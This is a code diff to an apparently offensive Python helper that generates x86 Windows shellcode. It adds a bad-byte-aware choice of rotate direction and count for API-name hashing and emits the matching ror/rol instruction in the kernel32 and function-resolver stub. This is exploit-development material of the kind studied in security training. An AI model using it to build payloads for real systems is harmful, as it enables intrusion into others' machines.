@@ -11,9 +11,16 @@ Offsets are allocated in bytes from a base register (``ebp`` by default):
 from __future__ import annotations
 
 import re
+from enum import Enum, auto
 
 
 from shellcode.push_string import push_dword, push_string
+
+MASK = 0xFFFFFFFF
+
+class RotateDirection(Enum):
+    RIGHT = auto()
+    LEFT = auto()
 
 class ShellcodeHelper:
     """Allocate named stack slots and emit assembly references to them."""
@@ -48,6 +55,20 @@ class ShellcodeHelper:
         self._variables: dict[str, int] = {}
         self._sizes: dict[str, int] = {}
         self._next_offset = start_offset
+        self._rotate_direction = RotateDirection.RIGHT
+        self._rotate_cnt = 0x0d
+
+        if len(self.bad_bytes):
+          if(0x0d in self.bad_bytes):
+            if(0x13 not in self.bad_bytes):
+              self._rotate_direction = RotateDirection.LEFT
+              self._rotate_cnt = 0x13
+            elif(0x0b not in self.bad_bytes):
+              self._rotate_cnt = 0x0b
+            elif(0x15 not in self.bad_bytes):
+              self._rotate_direction = RotateDirection.LEFT
+              self._rotate_cnt = 0x15
+
 
         # setup mandatory variables
         self.add(self._find_func)
@@ -123,28 +144,31 @@ class ShellcodeHelper:
       ]
       return asm
 
-    def _ror_str(self, byte, count):
-      """Rotate a 32-bit value right, matching the hash routine used in shellcode."""
-      value = byte & 0xFFFFFFFF
-      shift = count % 32
+    def _rotate_str(self, byte):
+      """Rotate a 32-bit value right or left, matching the hash routine used in shellcode."""
+      value = byte & MASK
+      shift = self._rotate_cnt % 32
       if shift == 0:
           return value
-      return ((value >> shift) | (value << (32 - shift))) & 0xFFFFFFFF
+      if self._rotate_direction == RotateDirection.RIGHT:
+        return ((value >> shift) | (value << (32 - shift))) & MASK
 
+      # Rotate Left
+      return ((value << shift) | (value >> (32 - shift))) & MASK
 
     def push_function_hash(self, name: str, clean_reg: str = "eax"):
         """Return the hash push instruction expected by the resolver stub."""
         edx = 0x00
-        ror_count = 0
+        rotate_count = 0
         # iterate for each character (ie: 'W', 'i', 'n', 'E', 'x', 'e'...)
         for eax in name:
             # add up the value
             edx = edx + ord(eax)
-            # If it is not the last character, apply a 13-bit right rotation (0xd)
+            # If it is not the last character, apply rotation
             # This ensures that each character uniquely affects the final signature
-            if ror_count < len(name) - 1:
-                edx = self._ror_str(edx, 0xD)
-            ror_count += 1
+            if rotate_count < len(name) - 1:
+                edx = self._rotate_str(edx)
+            rotate_count += 1
         # pushes result
         return push_dword(edx, clean_reg, self.bad_bytes)
 
@@ -161,6 +185,11 @@ class ShellcodeHelper:
 
     def get_common_shellcode(self):
       """Return the shared resolver/bootstrap assembly used by payload builders."""
+
+      # Create the matching hash rotation asm based on the chosen rotation
+      hash_rotate_instruction = "rol" if self._rotate_direction == RotateDirection.LEFT else "ror"
+      hash_rotate_asm = f"{hash_rotate_instruction} edx, {hex(self._rotate_cnt)};"
+
       common_shellcode = [
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;", # ECX = 0
@@ -177,7 +206,7 @@ class ShellcodeHelper:
         "       jmp find_function_shorten_bnc   ;", # Short jump
         "   find_function_ret:                   ", #
         "       pop esi                         ;", # POP the return address from the stack
-        self.write_var("find_function", "esi")      , # Save find_function address for later usage
+        self.write_var("find_function", "esi")    , # Save find_function address for later usage
         "       jmp get_load_library_a          ;", # we need to guarantee loading of LoadLibraryA
         "   find_function_shorten_bnc:           ", #
         "       call find_function_ret          ;", # Relative CALL with negative offset
@@ -204,7 +233,7 @@ class ShellcodeHelper:
         "       lodsb                           ;", # Load the next byte from esi into al
         "       test al, al                     ;", # Check for NULL terminator
         "       jz compute_hash_finished        ;", # If the ZF is set, we've hit the NULL term
-        "       ror edx, 0x0d                   ;", # Rotate edx 13 bits to the right
+        hash_rotate_asm                           , # Rotate edx for hashing of function
         "       add edx, eax                    ;", # Add the new byte to the accumulator
         "       jmp compute_hash_again          ;", # Next iteration
         "   compute_hash_finished:               ", #
@@ -238,7 +267,7 @@ class ShellcodeHelper:
 
       print(f"Space reserved: {hex(reserved_bytes)} bytes, reserving a total of {hex(decrease_stack_val)} stack bytes.")
 
-      add_negative_decrease_stack_val = 0xffffffff & (0-(decrease_stack_val))
+      add_negative_decrease_stack_val = (0-(decrease_stack_val)) & MASK
 
       return [
         "mov ebp, esp;",
